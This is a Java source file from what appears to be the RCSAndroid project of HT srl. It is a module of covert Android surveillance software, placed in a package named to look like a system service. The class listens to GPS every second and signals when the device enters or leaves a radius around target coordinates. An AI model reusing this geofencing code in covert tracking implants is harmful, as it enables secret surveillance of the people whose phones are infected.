/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSAndroid
 * File         : GPSLocatorDistance.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.android.service.agent.position;

import android.app.PendingIntent;
import android.content.Context;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Bundle;
import android.os.Looper;
import android.util.Log;

import com.android.service.Status;

public class GPSLocatorDistance extends GPSLocator implements LocationListener {
	private static final String TAG = "GPSLocDist";
	private float latitude;
	private float longitude;
	private float distance;
	private long expiration;
	private PendingIntent intent;
	private RangeObserver rangeObserver;
	private Location location;

	boolean entered = false;

	public GPSLocatorDistance(RangeObserver listener, float latitude, float longitude, float distance) {

		super();

		this.rangeObserver = listener;
		this.latitude = latitude;
		this.longitude = longitude;
		this.distance = distance;

		setListener(this);
	}

	@Override
	public void go(LocationListener listener, LocationManager lm) {
		lm.requestLocationUpdates(LocationManager.GPS_PROVIDER, 1000, 1L, this, Looper.getMainLooper());
	}

	public void onLocationChanged(Location location) {
		if (this.location == null) {
			this.location = new Location(location);
			this.location.setLatitude(latitude);
			this.location.setLongitude(longitude);
		}
		float actualDistance = this.location.distanceTo(location);
		if (actualDistance < distance) {
			if (!entered) {

				rangeObserver.notification(true);
				entered = true;
			} else {
				Log.d("QZ", TAG + " Already entered");

			}
		} else {
			if (entered) {

				rangeObserver.notification(false);
				entered = false;
			} else {
				Log.d("QZ", TAG + " Already exited");
			}

		}
	}

	public void onProviderDisabled(String arg0) {
		Log.d("QZ", TAG + " onProviderDisabled: " + arg0);

	}

	public void onProviderEnabled(String arg0) {
		Log.d("QZ", TAG + " onProviderEnabled: " + arg0);
	}

	public void onStatusChanged(String arg0, int arg1, Bundle arg2) {
		Log.d("QZ", TAG + " onStatusChanged: " + arg0 + "," + arg1);

	}

}
